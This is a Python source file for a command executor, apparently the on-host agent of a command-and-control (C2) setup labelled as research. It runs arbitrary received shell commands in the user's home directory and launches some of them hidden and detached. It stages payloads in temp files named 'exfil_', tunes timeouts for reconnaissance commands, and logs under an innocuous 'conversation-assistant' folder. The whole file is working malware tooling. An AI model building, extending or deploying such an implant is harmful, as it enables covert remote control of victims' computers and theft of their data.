#!/usr/bin/env python3
"""
Command executor for C2 research environment
"""
import subprocess
import logging
import os
from typing import Dict, Any
from pathlib import Path
import datetime

logger = logging.getLogger(__name__)


class CommandExecutor:
    """Executes commands"""

    def __init__(self):
        self.execution_log = Path.home() / ".config" / "conversation-assistant" / "execution.log"
        self.execution_log.parent.mkdir(parents=True, exist_ok=True)
        self.is_windows = os.name == 'nt'
        self.is_macos = os.uname().sysname == 'Darwin' if hasattr(os, 'uname') else False

    def execute(self, command: str, payload_data: str = None) -> Dict[str, Any]:
        """
        Execute command and return results

        Args:
            command: Shell command to execute
            payload_data: Optional data to write to temp file before execution

        Returns:
            Dict with stdout, stderr, return_code, error
        """
        # Write payload data to temp file if provided
        payload_file = None
        if payload_data:
            payload_file = self._write_payload_to_temp(payload_data)
            logger.info(f"Payload data written to: {payload_file}")

        # Log execution attempt
        self._log_execution(command)

        # Replace {{PAYLOAD_FILE}} placeholder with actual temp file path
        if payload_file and '{{PAYLOAD_FILE}}' in command:
            command = command.replace('{{PAYLOAD_FILE}}', payload_file)
            logger.info(f"Command updated with payload file: {command[:100]}...")

        try:
            # Check if this is a GUI/background command that should be detached
            if self._is_detached_command(command):
                return self._execute_detached(command)

            # Regular command execution
            return self._execute_regular(command)

        except subprocess.TimeoutExpired as e:
            logger.error(f"Command timeout: {command}")
            return {
                "stdout": "",
                "stderr": f"Command timed out after {e.timeout} seconds",
                "return_code": -1,
                "error": "TIMEOUT"
            }

        except Exception as e:
            logger.error(f"Execution error: {e}")
            return {
                "stdout": "",
                "stderr": str(e),
                "return_code": -1,
                "error": "EXCEPTION"
            }

    def _is_detached_command(self, command: str) -> bool:
        """
        Check if command should be executed in detached mode (non-blocking)

        Args:
            command: Command to check

        Returns:
            True if command should run detached
        """
        command_lower = command.lower().strip()

        # macOS: open command always runs detached
        if command_lower.startswith('open '):
            return True

        # macOS: say command can run detached
        if command_lower.startswith('say '):
            return False  # Actually want to capture output for say

        # Windows: GUI applications
        if self.is_windows:
            first_word = command.strip().split()[0].lower() if command.strip() else ""
            windows_gui_apps = [
                "calc.exe", "calc", "notepad.exe", "notepad",
                "taskmgr.exe", "taskmgr", "mspaint.exe", "mspaint",
                "msinfo32.exe", "msinfo32"
            ]
            return first_word in windows_gui_apps

        return False

    def _execute_detached(self, command: str) -> Dict[str, Any]:
        """
        Execute command in detached mode (non-blocking)

        Args:
            command: Command to execute

        Returns:
            Success response
        """
        logger.info(f"Executing detached command: {command[:50]}...")

        try:
            if self.is_windows:
                # Windows: use start command
                subprocess.Popen(
                    ['cmd', '/c', 'start', '/b', command],
                    cwd=Path.home(),
                    env=os.environ.copy(),
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            else:
                # macOS/Unix: run with shell, detached
                subprocess.Popen(
                    command,
                    shell=True,
                    cwd=Path.home(),
                    env=os.environ.copy(),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )

            logger.info(f"Detached command launched successfully: {command[:50]}...")
            return {
                "stdout": f"Command launched successfully (detached mode)",
                "stderr": "",
                "return_code": 0,
                "error": None
            }

        except Exception as e:
            logger.error(f"Failed to execute detached command: {e}")
            return {
                "stdout": "",
                "stderr": str(e),
                "return_code": -1,
                "error": "DETACH_FAILED"
            }

    def _execute_regular(self, command: str) -> Dict[str, Any]:
        """
        Execute regular command with output capture

        Args:
            command: Command to execute

        Returns:
            Execution results
        """
        # Determine timeout based on command
        timeout_duration = self._get_timeout(command)

        logger.info(f"Executing command: {command[:50]}... (timeout: {timeout_duration}s)")

        if self.is_windows:
            # Windows: use cmd /c
            result = subprocess.run(
                ['cmd', '/c', command],
                shell=False,
                capture_output=True,
                timeout=timeout_duration,
                text=True,
                cwd=Path.home(),
                env=os.environ.copy()
            )
        else:
            # macOS/Unix: use shell
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=timeout_duration,
                text=True,
                cwd=Path.home(),
                env=os.environ.copy()
            )

        logger.info(f"Command completed: {command[:30]}... (return_code: {result.returncode})")

        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "error": None
        }

    def _get_timeout(self, command: str) -> int:
        """
        Determine appropriate timeout for command

        Args:
            command: Command to check

        Returns:
            Timeout in seconds
        """
        command_lower = command.lower()

        # Network commands need more time
        if any(net_cmd in command_lower for net_cmd in ['netstat', 'nslookup', 'ping', 'ipconfig', 'ifconfig']):
            return 45

        # System info commands need even more time
        if any(sys_cmd in command_lower for sys_cmd in ['systeminfo', 'tasklist', 'system_profiler']):
            return 60

        # Default timeout
        return 30

    def _write_payload_to_temp(self, payload_data: str) -> str:
        """
        Write payload data to a temporary file

        Args:
            payload_data: Data to write

        Returns:
            Path to the temp file
        """
        import tempfile
        import json

        try:
            # Create temp file
            fd, temp_path = tempfile.mkstemp(suffix='.txt', prefix='exfil_')

            # Write payload data
            with open(temp_path, 'w', encoding='utf-8') as f:
                # Try to format as JSON if it's structured data
                try:
                    if isinstance(payload_data, (dict, list)):
                        f.write(json.dumps(payload_data, indent=2))
                    else:
                        f.write(str(payload_data))
                except:
                    f.write(str(payload_data))

            # Close file descriptor
            import os
            os.close(fd)

            logger.info(f"Payload written to temp file: {temp_path} ({len(str(payload_data))} bytes)")
            return temp_path

        except Exception as e:
            logger.error(f"Error writing payload to temp file: {e}")
            return None

    def _log_execution(self, command: str):
        """
        Log command execution for audit trail

        Args:
            command: Command being executed
        """
        timestamp = datetime.datetime.now().isoformat()

        log_entry = f"{timestamp} | EXEC | {command}\n"

        try:
            with open(self.execution_log, "a", encoding='utf-8') as f:
                f.write(log_entry)
        except Exception as e:
            logger.error(f"Failed to write execution log: {e}")
